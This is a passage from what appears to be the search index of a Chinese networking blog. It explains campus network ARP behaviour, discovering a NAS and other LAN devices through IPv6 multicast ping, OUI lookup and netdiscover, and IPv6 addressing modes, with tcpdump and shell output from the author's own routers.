\u5730\u5740\u5176\u5b9e\u662f\u5b66\u6821\u7f51\u5173\u7684\u5730\u5740\u3002\u8fd9\u662f\u56e0\u4e3a\u5bf9\u9762\u673a\u5668\u6536\u5230 ip \u5305\u540e\uff0c\u5e76\u4e0d\u4f1a\u5728\u610f\u4e8c\u5c42\u662f\u600e\u4e48\u4f20\u8fc7\u6765\u7684\uff0c\u4ea7\u751f\u54cd\u5e94 ip \u5305\u540e\uff0c\u8fd8\u662f\u6309\u7167\u539f\u672c\u6d41\u7a0b\u53d1\u9001\u3002</li> </ul> <pre><code>root@op1 \u279c  ~ tcpdump -e -ni br-wan icmp and host 202.38.78.82\ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on br-wan, link-type EN10MB (Ethernet), snapshot length 262144 bytes\n17:53:47.761041 00:16:3e:e2:4e:72 &gt; 00:11:32:b2:3f:d9, ethertype IPv4 (0x0800), length 98: 114.214.236.72 &gt; 202.38.78.82: ICMP echo request, id 53752, seq 0, length 64\n17:53:47.761502 e8:78:ee:13:cc:01 &gt; 00:16:3e:e2:4e:72, ethertype IPv4 (0x0800), length 98: 202.38.78.82 &gt; 114.214.236.72: ICMP echo reply, id 53752, seq 0, length 64\n17:53:48.761083 00:16:3e:e2:4e:72 &gt; 00:11:32:b2:3f:d9, ethertype IPv4 (0x0800), length 98: 114.214.236.72 &gt; 202.38.78.82: ICMP echo request, id 53752, seq 1, length 64\n17:53:48.761326 e8:78:ee:13:cc:01 &gt; 00:16:3e:e2:4e:72, ethertype IPv4 (0x0800), length 98: 202.38.78.82 &gt; 114.214.236.72: ICMP echo reply, id 53752, seq 1, length 64\n</code></pre> <p>\u81f3\u4e8e\u5b66\u6821\u662f\u5982\u4f55 dhcp \u5206\u914d\u5730\u5740\u7684\uff0c\u901a\u5e38\u662f\u6839\u636e\u8be5\u680b\u697c\u7684\u8bbe\u5907\u6570\u76ee\uff0c\u914d\u7f6e\u597d\u5730\u5740\u6c60\uff0c\u7136\u540e\u968f\u673a\u4ece\u5730\u5740\u6c60\u4e2d\u5206\u914d ip\u3002</p>","tags":["\u7f51\u7edc","arp"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2023/11/21/2023-11-21-NAS%E6%97%A0%E6%B3%95%E6%89%AB%E6%8F%8F%E5%88%B0%E6%B6%89%E5%8F%8A%E7%9A%84%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/#\u7591\u95ee\u4e8c\u5bbf\u820d\u8def\u7531\u5668-ip-neigh-wan-\u53e3\u4e3a\u4f55\u4e0d\u540c-ip-\u7684-mac-\u5730\u5740\u662f\u76f8\u540c\u7684","title":"\u7591\u95ee\u4e8c\uff1a\u5bbf\u820d\u8def\u7531\u5668 ip neigh wan \u53e3\uff0c\u4e3a\u4f55\u4e0d\u540c ip \u7684 mac \u5730\u5740\u662f\u76f8\u540c\u7684\uff1f","text":"<p>\u53ef\u4ee5\u53d1\u73b0\u5bbf\u820d\u8def\u7531\u5668 neigh \u7684 mac \u5730\u5740\u90fd\u662f\u76f8\u540c\u7684</p> <pre><code>root@op2 \u279c  ~ ip neigh |grep eth0\n114.214.175.254 dev eth0 lladdr 5c:dd:70:91:72:e2 DELAY\n114.214.173.13 dev eth0 lladdr 5c:dd:70:91:72:e2 STALE\n114.214.172.86 dev eth0 lladdr 5c:dd:70:91:72:e2 STALE\n114.214.172.87 dev eth0 lladdr 5c:dd:70:91:72:e2 STALE\n</code></pre> <p>\u5b9e\u9645\u4e0a\u5bbf\u820d\u7684\u7f51\u7edc\u7ed3\u6784\u662f\u6bd4\u8f83\u590d\u6742\u7684</p> <ul> <li>\u53ef\u80fd\u6bcf\u4e00\u5c42\u6709\u4e00\u4e2a\u4ea4\u6362\u673a\uff0c\u8fde\u63a5\u5230\u6574\u680b\u697c\u7684\u4ea4\u6362\u673a\u3002</li> <li>\u5bbf\u820d\u7684\u6bcf\u4e2a\u5899\u4e0a\u7684\u7aef\u53e3\u90fd\u662f vlan \u9694\u79bb\u7684<ul> <li>\u4e5f\u5c31\u662f\u4e8c\u5c42\u4e0a\u8bbe\u5907\u95f4\u662f\u65e0\u6cd5\u63a5\u6536\u5230\u5bf9\u65b9\u7684\u7f51\u7edc\u5305\u7684\uff0c\u800c\u4e0d\u50cf\u4e00\u4e2a\u5e7f\u64ad\u57df\u4e2d\uff0c\u5e7f\u64ad\u5305\u6240\u6709\u8bbe\u5907\u90fd\u80fd\u6536\u5230</li> <li>vlan id 12bit \u7684\u9650\u5236\u53ef\u80fd\u4e0d\u591f\u7528\uff0c\u56e0\u6b64\u8fd9\u91cc\u8fd8\u6d89\u53ca\u5230 q in q \u7684\u6280\u672f</li> <li>\u9694\u79bb\u7684\u76ee\u7684\u4e3b\u8981\u662f\u4e3a\u4e86\u964d\u4f4e\u5e7f\u64ad\u98ce\u66b4</li> </ul> </li> <li>\u8fd8\u6709 BRAS \u8bbe\u5907\u8d1f\u8d23\u9274\u6743\u4ee5\u53ca\u8def\u7531</li> </ul> <p>\u90a3\u4e48\u4f60\u53ef\u80fd\u597d\u5947\uff0c\u5982\u679c\u5bbf\u820d\u697c\u6709\u4e24\u53f0\u8bbe\u5907\u4f4d\u4e8e\u540c\u4e00\u4e2a\u7f51\u6bb5\uff0c\u5b83\u4eec\u76f8\u4e92\u8bbf\u95ee\u4f1a\u53d1\u751f\u4ec0\u4e48\uff1f\uff08\u4e0d\u540c\u7f51\u6bb5\u5176\u5b9e\u548c\u4e0a\u8282\u7684\u60c5\u51b5\u4e00\u6837\uff0c\u90fd\u9700\u8981\u901a\u8fc7\u7f51\u5173\u8f6c\u53d1\uff09 \u5f53\u8bbe\u5907 A \u8bbf\u95ee\u8bbe\u5907 B \u65f6\uff0c\u7531\u4e8e\u540c\u4e00\u4e2a\u7f51\u6bb5\uff0c\u6240\u4ee5\u4f1a\u5c1d\u8bd5 ARP \u83b7\u5f97\u8bbe\u5907 B \u7684 mac \u5730\u5740\u3002\u4f46\u662f\u7531\u4e8e A\uff0cB \u4e8c\u5c42\u9694\u79bb\uff0cB \u6536\u4e0d\u5230 arp \u8bf7\u6c42\u3002\u4e5f\u5c31\u662f A \u65e0\u6cd5\u83b7\u5f97 B \u7684 mac \u5730\u5740\u3002</p> <p>\u4f46\u662f\u795e\u5947\u7684\u662f\uff0c\u5b66\u6821\u7684\u4ea4\u6362\u673a\u8bbe\u5907 C \u5f00\u542f\u4e86\u4ee3\u7406 ARP\uff0c\u6b64\u65f6\u5b66\u6821\u8bbe\u5907\u4f1a\u201c\u6b3a\u9a97\u201dA\uff0c\u8bf4\u5730\u5740 B \u7684 mac \u5730\u5740\u662f C\u3002\u4e8e\u662f A \u5c31\u4f1a\u628a\u5305\u53d1\u7ed9 C \u4e86\uff0cC \u518d\u6839\u636e\u76ee\u7684 ip \u53d1\u9001\u7ed9 B\u3002 \u4e0a\u8ff0\u8fc7\u7a0b\u548c A \u5c06\u5305\u53d1\u7ed9\u7f51\u5173\uff0c\u7f51\u5173\u5728\u8f6c\u53d1\u7ed9 B \u57fa\u672c\u662f\u4e00\u6837\u7684\u3002\u53ea\u4e0d\u8fc7\u5728 A \u770b\u6765\u4ee5\u4e3a\u662f\u76f4\u63a5\u53d1\u9001\u7ed9\u4e86 B\u3002\u8fd9\u91cc\u4e5f\u518d\u6b21\u9a8c\u8bc1\u4e86\u90a3\u53e5\u8bdd\uff0c\u4e09\u5c42\u5e76\u4e0d\u5728\u610f\u4e8c\u5c42\u662f\u600e\u4e48\u53d1\u7684\uff0c\u53ea\u8981\u5305\u6700\u7ec8\u80fd\u5230\u6b63\u786e\u7684\u5730\u65b9\u5373\u53ef\u3002</p> <p>\u4e86\u89e3\u4ee3\u7406\u5730\u5740\u89e3\u6790\u534f\u8bae (ARP) - Cisco</p> <ul> <li>\u8bbe\u5907\u914d\u7f6e\u4e86 172.16.10.100/16\uff0c\u63a9\u7801\u76f8\u5f53\u4e8e\u544a\u8bc9\u8bbe\u5907\u80fd\u591f\u8bbf\u95ee 172.16.0.0/16 \u6574\u4e2a\u7f51\u6bb5\u3002\u8bbf\u95ee\u8be5\u7f51\u6bb5\u65f6\u4f1a\u76f4\u63a5\u53d1\u9001 arp \u8bf7\u6c42\u3002</li> </ul>","tags":["\u7f51\u7edc","arp"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2023/11/21/2023-11-21-NAS%E6%97%A0%E6%B3%95%E6%89%AB%E6%8F%8F%E5%88%B0%E6%B6%89%E5%8F%8A%E7%9A%84%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/#nas-\u65e0\u6cd5\u626b\u63cf\u539f\u56e0","title":"NAS \u65e0\u6cd5\u626b\u63cf\u539f\u56e0","text":"<p>\u626b\u63cf\u8f6f\u4ef6\u7684\u539f\u7406\uff08\u731c\u6d4b\uff09</p> <ul> <li>\u8bbe\u5907\u7684 MAC \u5730\u5740\u662f\u5df2\u77e5\u7684\uff0c\u5e76\u4e14\u6bcf\u4e2a\u5382\u5546\u90fd\u6709\u5355\u72ec\u7684 vendor id\u3002\u56e0\u6b64\u53ea\u8981\u83b7\u5f97\u5b50\u7f51\u6240\u6709\u8bbe\u5907\u7684 mac\uff0c\u7136\u540e\u5339\u914d\u5230\u8bbe\u5907\u5373\u53ef</li> <li>\u4e3a\u4e86\u63a2\u6d4b\u5b50\u7f51\u5185\u6240\u6709\u8bbe\u5907 MAC\uff0c\u53ef\u4ee5\u5148\u5411\u5b50\u7f51\u53d1\u9001\u4e00\u4e2a\u5e7f\u64ad\u6d88\u606f\uff0c\u6bd4\u5982 192.168.1.255/24</li> <li>\u5e7f\u64ad\u540e ARP \u8868\u4fbf\u5305\u542b\u4e86\u6240\u6709\u7684\u90bb\u5c45</li> </ul> <p>\u800c\u6211\u4eec\u9047\u5230\u626b\u63cf\u4e0d\u5230\u7684\u539f\u56e0\u5728\u4e8e\u7b14\u8bb0\u672c\u548c NAS \u901a\u8fc7\u5b66\u6821 dhcp \u83b7\u5f97\u7684 ip \u5730\u5740\u4e0d\u662f\u540c\u4e00\u4e2a\u7f51\u6bb5\uff0c\u800c\u64cd\u4f5c\u7cfb\u7edf\u68c0\u6d4b\u5230\u7684 ARP \u6d88\u606f\u5982\u679c\u5730\u5740\u4e0d\u5728\u4e00\u4e2a\u7f51\u6bb5\uff0c\u90a3\u4e48\u662f\u4e0d\u4f1a\u66f4\u65b0 arp \u8868\u7684\u3002</p> <p>\u901a\u8fc7 tcpdump \u53ef\u4ee5\u6293\u5230\u5f88\u591a\u4e0d\u5728\u540c\u4e00\u7f51\u6bb5\u7684 ARP \u8bf7\u6c42\uff0c\u4f46\u662f\u53ef\u4ee5\u53d1\u73b0 ip neigh \u53ea\u5305\u542b\u540c\u4e00\u7f51\u6bb5\u7684\u8bbe\u5907</p> <pre><code>root@op1 \u279c  ~ tcpdump -e -ni br-wan arp\ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on br-wan, link-type EN10MB (Ethernet), snapshot length 262144 bytes\n19:22:00.638083 58:11:22:a4:37:23 &gt; ff:ff:ff:ff:ff:ff, ethertype ARP (0x0806), length 60: Request who-has 210.45.76.56 tell 210.45.76.239, length 46\n19:22:01.623857 58:11:22:a4:37:23 &gt; ff:ff:ff:ff:ff:ff, ethertype ARP (0x0806), length 60: Request who-has 210.45.76.56 tell 210.45.76.239, length 46\n19:22:02.084291 24:69:68:a6:27:05 &gt; ff:ff:ff:ff:ff:ff, ethertype ARP (0x0806), length 60: Request who-has 202.38.78.179 tell 202.38.78.138, length 46\n19:22:02.217667 f0:2f:74:dc:8a:df &gt; ff:ff:ff:ff:ff:ff, ethertype ARP (0x0806), length 60: Request who-has 202.38.78.116 tell 202.38.78.208, length 46\n19:22:02.622637 58:11:22:a4:37:23 &gt; ff:ff:ff:ff:ff:ff, ethertype ARP (0x0806), length 60: Request who-has 210.45.76.56 tell 210.45.76.239, length 46\n</code></pre>","tags":["\u7f51\u7edc","arp"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2023/11/21/2023-11-21-NAS%E6%97%A0%E6%B3%95%E6%89%AB%E6%8F%8F%E5%88%B0%E6%B6%89%E5%8F%8A%E7%9A%84%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/#ipv6-\u5e7f\u64ad\u5e76\u7ed3\u5408-mac-oui-\u67e5\u8be2\u8bbe\u5907","title":"ipv6 \u5e7f\u64ad\u5e76\u7ed3\u5408 MAC OUI \u67e5\u8be2\u8bbe\u5907","text":"<p>\u7531\u4e8e ipv6 \u6709\u4e13\u95e8\u7528\u4e8e\u8868\u793a link scope \u7684\u5730\u5740<code>fe80</code>\uff0c\u4e0d\u5b58\u5728\u50cf ipv4 \u4e0d\u5904\u4e8e\u540c\u4e00\u4e2a\u7f51\u6bb5\u7684\u60c5\u51b5\u3002\u56e0\u6b64 ipv6 \u7684\u5e7f\u64ad\u80fd\u591f\u63a2\u6d4b\u5e7f\u64ad\u57df\u4e0a\u7684\u6240\u6709\u8bbe\u5907\uff08\u81ea\u5df1\u7684\u7406\u89e3\uff0c\u4e0d\u4e25\u8c28\u8fd8\u8bf7\u6307\u6b63\uff09 \u6211\u4eec\u53ea\u9700\u8981 ping \u4e0b ipv6 \u7684\u5e7f\u64ad\u5730\u5740</p> <pre><code>root@op1 \u279c  ~ ping ff02::1%br-wan\n</code></pre> <p>\u7136\u540e\u5c31\u4f1a\u53d1\u73b0 ipv6 \u7684 neighbor \u6570\u91cf\u4e00\u4e0b\u5b50\u53d8\u5f97\u5f88\u5927\uff08\u5c1d\u8bd5\u5728\u4e24\u53f0\u4e0d\u540c\u8bbe\u5907\u4e0a\uff0c\u90fd\u5f97\u5230\u4e86\u975e\u5e38\u63a5\u8fd1\u7684\u6570\u5b57\uff09\uff0c\u5e76\u4e14\u4e5f\u77ac\u95f4\u63a2\u6d4b\u51fa\u4e86\u5b9e\u9a8c\u5ba4\u7684\u4e24\u53f0\u7fa4\u6656</p> <pre><code>root@op1 \u279c  ~ ip -6 n |grep br-wan |wc -l\n247\nroot@op1 \u279c  ~ ip -6 n |grep br-wan |grep 3f:d9\nfe80::211:32ff:feb2:3fd9 dev br-wan lladdr 00:11:32:b2:3f:d9 DELAY\nroot@op1 \u279c  ~ ip -6 n |grep br-wan |grep b3e9\nfe80::9209:d0ff:fe00:b3e9 dev br-wan lladdr 90:09:d0:00:b3:e9 PROBE\n</code></pre> <p>\u6709\u4e86 mac \u5730\u5740\u540e\uff0c\u6211\u4eec\u80fd\u4e0d\u80fd\u81ea\u52a8\u89e3\u6790\u8bbe\u5907\u578b\u53f7\u5462</p> <p>The first half of the six octets represent the Organizational Unique Identifier (OUI) and the other half is the Network Interface Controller (NIC) which is unique for every device in the world.</p> <p>\u53ef\u4ee5\u4f7f\u7528 OUI \u6570\u636e\u5e93\u67e5\u8be2 Command-line tool to obtain OUI vendor info from MAC address? - Unix &amp; Linux Stack Exchange</p> <pre><code>wget \"http://standards-oui.ieee.org/oui.txt\"\n\nping ff02::1%vmbr0\nip -6 n |grep vmbr0 | awk '{print $5}' | tee ip6-neigh.log  #\u83b7\u5f97\u6240\u6709\u90bb\u5c45\u7684mac\u5730\u5740\n\nfor m in $(tr -d ':' &lt; ip6-neigh.log | grep -o '^......'); do grep -iF \"$m\" oui.txt; done |tee mac_vendor.log  # \u5bf9\u6bcf\u4e2amac\u67e5\u8be2\u6570\u636e\u5e93\n</code></pre>","tags":["\u7f51\u7edc","arp"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2023/11/21/2023-11-21-NAS%E6%97%A0%E6%B3%95%E6%89%AB%E6%8F%8F%E5%88%B0%E6%B6%89%E5%8F%8A%E7%9A%84%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/#netdiscover-\u81ea\u52a8\u63a2\u6d4b\u8bbe\u5907","title":"netdiscover \u81ea\u52a8\u63a2\u6d4b\u8bbe\u5907","text":"<p>netdiscover | Kali Linux Tools netdiscover \u4e5f\u662f\u9488\u5bf9\u4e0a\u8ff0\u9700\u6c42\uff0c\u53ef\u4ee5\u63a2\u6d4b\u5c40\u57df\u7f51\u5185\u8bbe\u5907\u3002</p> <p>netdiscover \u57fa\u4e8e ARP\uff0c\u80fd\u591f\u6355\u6349 ARP \u8bf7\u6c42\uff08\u4e3b\u52a8\u626b\u63cf\u53d1\u8d77\u6216\u8005\u88ab\u52a8\u63a2\u6d4b\uff09\uff0c\u5e76\u4e14\u89e3\u6790 mac \u5730\u5740\u8bbe\u5907\u4fe1\u606f</p> <pre><code>netdiscover -p -i vmbr0  # -p \u8868\u793a\u88ab\u52a8\u6a21\u5f0f\n</code></pre> <ul> <li>\u4f46\u662f\u4e0d\u77e5\u9053\u4e3a\u4f55\u7fa4\u6656\u7684 IP \u662f 0.0.0.0<ul> <li>\u624b\u52a8 ping \u4e0b\u7fa4\u6656 ip \u540e\uff0cnetdiscover \u53c8\u53ef\u4ee5\u6293\u5230\u5730\u5740 </li> </ul> </li> </ul>","tags":["\u7f51\u7edc","arp"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2023/11/21/2023-11-21-NAS%E6%97%A0%E6%B3%95%E6%89%AB%E6%8F%8F%E5%88%B0%E6%B6%89%E5%8F%8A%E7%9A%84%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/#\u53c2\u8003","title":"\u53c2\u8003","text":"<p>Find Device or IP Address with MAC Address - Command-line &amp; Tools! (pcwdld.com)</p> <ul> <li>arp</li> <li>dhcp</li> </ul>","tags":["\u7f51\u7edc","arp"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2023/08/02/IPv6%20%E7%9F%A5%E8%AF%86%E5%92%8C%20%20openwrt%20relay%20%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%9D%91/","title":"IPv6 \u77e5\u8bc6\u548c  openwrt relay \u6a21\u5f0f\u7684\u5751","text":"<p>ipv6 \u534f\u8bae\u8be6\u7ec6\u4ecb\u7ecd\u4e86 ipv6 \u51e0\u79cd\u83b7\u5f97\u5730\u5740\u6a21\u5f0f\u7684\u533a\u522b\uff1aSLAAC, \u65e0\u72b6\u6001 DHCPv6 \u548c \u6709\u72b6\u6001 DHCPv6</p> <p>\u53e6\u5916\u4ecb\u7ecd\u4e86\u4e0b openwrt \u4f7f\u7528 relay \u6a21\u5f0f\u5bfc\u81f4\u9700\u8981 ping wan \u53e3\u624d\u80fd\u901a\u7684\u539f\u56e0</p>","tags":["ipv6","slaac","dhcpv6","PD","relay","NDP"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2023/08/02/IPv6%20%E7%9F%A5%E8%AF%86%E5%92%8C%20%20openwrt%20relay%20%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%9D%91/#ipv6-\u534f\u8bae","title":"ipv6 \u534f\u8bae","text":"","tags":["ipv6","slaac","dhcpv6","PD","relay","NDP"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2023/08/02/IPv6%20%E7%9F%A5%E8%AF%86%E5%92%8C%20%20openwrt%20relay%20%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%9D%91/#\u53c2\u8003\u8d44\u6599","title":"\u53c2\u8003\u8d44\u6599","text":"<p>ipv6\u5730\u5740\u548c\u534f\u8bae\uff1aNetwork Layer: IPv6 addressing and IPv6 protocol - ICTShore.com</p> <p>ipv6\u7cfb\u5217\u6559\u5b66 -  IPv6 from scratch - the very basics of IPv6 explained - IPv6 explained - SLAAC and DHCPv6 (IPv6 from scratch part 2) - openwrt ipv6\u8bbe\u7f6e\uff1a\u6709PD\u60c5\u51b5\uff0crelay\uff0cVPN tunnel\u6765\u83b7\u5f97PD\uff1aIPv6 with OpenWrt - YouTube - \u5bf9\u5e94ipv6 cheat sheet\uff1aipv6 cheat sheet</p> <p>NDP - How to: IPv6 Neighbor Discovery | APNIC Blog   - NS, NA\u7528\u4e8e\u5b9e\u73b0arp   - NS\u7528\u4e8e\u5b9e\u73b0DAD(Duplicate Address Detection\uff09</p>","tags":["ipv6","slaac","dhcpv6","PD","relay","NDP"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2023/08/02/IPv6%20%E7%9F%A5%E8%AF%86%E5%92%8C%20%20openwrt%20relay%20%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%9D%91/#ipv6-address","title":"ipv6 address","text":"<ul> <li>\u9996\u5148ipv6\u5730\u5740\u6709\u4e0d\u540c\u7684scope</li> <li>\u5728\u6bcf\u4e2ascope\u4e0b\u4e3a\u4e86\u5b9e\u73b0\u4e00\u4e9b\u7279\u6b8a\u529f\u80fd\uff0c\u9700\u8981\u4f7f\u7528\u4e0d\u540c\u7684\u5730\u5740\u3002\u6bd4\u5982link-local scope\u4e0b\u5b9e\u73b0\u5e7f\u64ad\u3002</li> </ul> <p>GLOBAL\u00a0- Everything (i.e. the whole internet), UNIQUE LOCAL\u00a0- Everything in our LAN (behind the internet gateway), LINK LOCAL\u00a0- Everything within the same collision domain that will not be routed (i.e. attached to the same switch).</p> Range Purpose ::1/128 Loopback Address (localhost) ::/128 Unspecified Address 2000::/3 GLOBAL Unicast (Internet) fc00::/7 Unique-Local (LAN) fe80::/10 Link-Local Unicast (Same switch) <ul> <li>You should always use the smallest possible scope for communication. </li> <li>A host can have\u00a0multiple\u00a0addresses in different scopes, even on the same interface.</li> </ul> <p>128 = 64(<code>Network</code> portion) + 64(<code>Host</code>) 64(network portion) = 48(<code>routing prefix</code>) + 16(<code>subnet id</code>)</p> <p>multicast addresses  in in the link-local scope</p> Range Purpose ff02::1 All Nodes within the network segment ff02::2 All Routers within the network segment ff02::fb mDNSv6 ff02::1:2 All DHCP Servers and Agents ff02::101 All NTP Servers ## IPv6 addressing methods <p>ipv4 - unicast, multicast and broadcast ipv6 - unicast, multicast, link-local\u00a0and\u00a0anycast</p>","tags":["ipv6","slaac","dhcpv6","PD","relay","NDP"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2023/08/02/IPv6%20%E7%9F%A5%E8%AF%86%E5%92%8C%20%20openwrt%20relay%20%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%9D%91/#link-local","title":"Link-local","text":"<p>An\u00a0IPv6 link-local address\u00a0is an address that is valid only\u00a0within the broadcast domain\u00a0(it is local to it). This address is not routable, meaning that no router can have a route to it because it must be directly connected, and can be compared at a Layer 2 address, because it behaves the same way.</p>","tags":["ipv6","slaac","dhcpv6","PD","relay","NDP"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2023/08/02/IPv6%20%E7%9F%A5%E8%AF%86%E5%92%8C%20%20openwrt%20relay%20%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%9D%91/#multicast","title":"Multicast","text":"<p>ipv6\u5220\u9664\u4e86\u5e7f\u64ad\u5730\u5740\uff0c\u800c\u662f\u7528\u591a\u64ad\u8fdb\u884c\u66ff\u4ee3\u3002</p> <p>a multicast address is an address \u201csubscribed\u201d by multiple nodes: these nodes will be listening to that address. All multicast addresses, in IPv6, belong to the\u00a0<code>ff00::/8</code>\u00a0prefix.</p> <p>\u7279\u6b8a\u7684\u5e7f\u64ad\u5730\u5740\uff1a</p> Address Scope Description <code>ff02::1</code> Link All nodes on the link. It effectively replaces a\u00a0broadcast\u00a0address. <code>ff02::2</code> Link All routers on the link.","tags":["ipv6","slaac","dhcpv6","PD","relay","NDP"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2023/08/02/IPv6%20%E7%9F%A5%E8%AF%86%E5%92%8C%20%20openwrt%20relay%20%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%9D%91/#anycast","title":"Anycast","text":"<p>\u5c06\u4e00\u4e2aunicast\u5730\u5740\u5206\u914d\u7ed9\u591a\u4e2a\u8bbe\u5907\u3002\u8fd9\u6837 To be more specific, it is actually a\u00a0unicast address assigned to multiple devices\u00a0around the world, and instead of identifying the device itself, it identifies the\u00a0services\u00a0it offers.</p> <p>This allows other devices to point to that services and reach the nearest device offering that service, without actually knowing what is the nearest device.</p>","tags":["ipv6","slaac","dhcpv6","PD","relay","NDP"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2023/08/02/IPv6%20%E7%9F%A5%E8%AF%86%E5%92%8C%20%20openwrt%20relay%20%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%9D%91/#neighbor-discovery--router-discovery","title":"Neighbor Discovery &amp; Router Discovery","text":"<p>NDP\u4ee3\u66ffipv4\u7684ARP\u534f\u8bae\u3002NDP\u57fa\u4e8eICMPv6 there is the\u00a0Address Resolution Protocol (ARP), which is used to map IPv4 addresses to MAC addresses. With IPv6, we can completely get rid of this protocol using a more efficient one, the\u00a0Neighbor Discovery Protocol (NDP). NDP relies on the\u00a0Internet Control Message Protocol version 6 (ICMPv6)\u00a0packet to do its job.</p> <p>icmp6\u62a5\u6587\u683c\u5f0f </p> <p>RFC 5175: IPv6 Router Advertisement Flags Option (rfc-editor.org) \u53e6\u5916\u5728option\u4e2d\u6709A flag\u548cL flag\uff08\u66f4\u5177\u4f53\u662fprefix info option\uff09 - The IPv6 Prefix Information Option or Fun with the L Flag (infoblox.com) - router - IPv6 RA flags and various combinations - Network Engineering Stack Exchange</p> <pre><code>root@op1 \u279c  ~ tcpdump -vvv -n -ttt -i eth1 \"icmp6 and (ip6[40] == 134 or ip6[40] == 133)\"\ntcpdump: listening on eth1, link-type EN10MB (Ethernet), capture size 262144 bytes\n 00:00:00.000000 IP6 (class 0xe0, hlim 255, next-header ICMPv6 (58) payload length: 64) fe80::8261:6cff:fef5:4e01 &gt; ff02::1: [icmp6 sum ok] ICMP6, router advertisement, length 64\n        hop limit 64, Flags [managed, other stateful], pref medium, router lifetime 1800s, reachable time 0ms, retrans timer 0ms\n          source link-address option (1), length 8 (1): 80:61:6c:f5:4e:01\n            0x0000:  8061 6cf5 4e01\n          mtu option (5), length 8 (1):  1500\n            0x0000:  0000 0000 05dc\n          prefix info option (3), length 32 (4): 2001:da8:d800:336::/64, Flags [onlink, auto], valid time 2592000s, pref. time 604800s\n            0x0000:  40c0 0027 8d00 0009 3a80 0000 0000 2001\n            0x0010:  0da8 d800 0336 0000 0000 0000 0000\n</code></pre> <ul> <li>NS, NA </li> </ul> <ul> <li>RS, RA </li> </ul>","tags":["ipv6","slaac","dhcpv6","PD","relay","NDP"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2023/08/02/IPv6%20%E7%9F%A5%E8%AF%86%E5%92%8C%20%20openwrt%20relay%20%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%9D%91/#slaac-stateless-dhcpv6-stateful","title":"SLAAC, stateless DHCPv6, stateful","text":"","tags":["ipv6","slaac","dhcpv6","PD","relay","NDP"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2023/08/02/IPv6%20%E7%9F%A5%E8%AF%86%E5%92%8C%20%20openwrt%20relay%20%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%9D%91/#stateless-auto-address-configuration-slaac","title":"Stateless Auto Address Configuration (SLAAC)","text":"<ul> <li>When a device comes online, it sends a\u00a0Router Solicitation\u00a0message. He\u2019s basically asking \u201cAre there some routers out there?\u201d</li> <li>If we have a router on the same network, that router will reply with a\u00a0Router Advertisement\u00a0message. contain information: <ul> <li>Who is the default gateway (the link-local address of the router itself)</li> <li>What is the global unicast prefix (for example,\u00a0<code>2001:DB8:ACAD:10::/64</code>)</li> </ul> </li> <li>the client is going to create a new global unicast address using the\u00a0EUI-64\u00a0technique</li> </ul> <p>\u7136\u800c\u65e0\u6cd5\u8bbe\u7f6e\u5176\u5b83\u4fe1\u606f\uff0c\u5982DNS</p>","tags":["ipv6","slaac","dhcpv6","PD","relay","NDP"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2023/08/02/IPv6%20%E7%9F%A5%E8%AF%86%E5%92%8C%20%20openwrt%20relay%20%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%9D%91/#stateless-dhcpv6","title":"Stateless DHCPv6","text":"<ul> <li>Router Advertisement has a flag called\u00a0<code>other-config</code>\u00a0set to 1.</li> <li>client use SLAAC to craft its own IPv6 address</li> <li>After the SLAAC process succeeds, the client will craft a\u00a0DHCPv6 request\u00a0and send it through the network.</li> </ul> <p>\u53eb\u505astateless\uff0c\u56e0\u4e3adhcpv6 server\u4e0d\u7ba1\u7406\u4efb\u4f55client\u7684lease\u3002\u800c\u53ea\u662f\u53d1\u9001\u989d\u5916\u4fe1\u606f\u5982DNS, domain name\u3002</p>","tags":["ipv6","slaac","dhcpv6","PD","relay","NDP"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2023/08/02/IPv6%20%E7%9F%A5%E8%AF%86%E5%92%8C%20%20openwrt%20relay%20%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%9D%91/#stateful-dhcpv6","title":"Stateful DHCPv6","text":"<ul> <li>Advertisement in reply contains the\u00a0<code>managed-config</code>\u00a0set to 1.</li> <li>The client will then generate a DHCPv6 request to get both addressing and extra information</li> 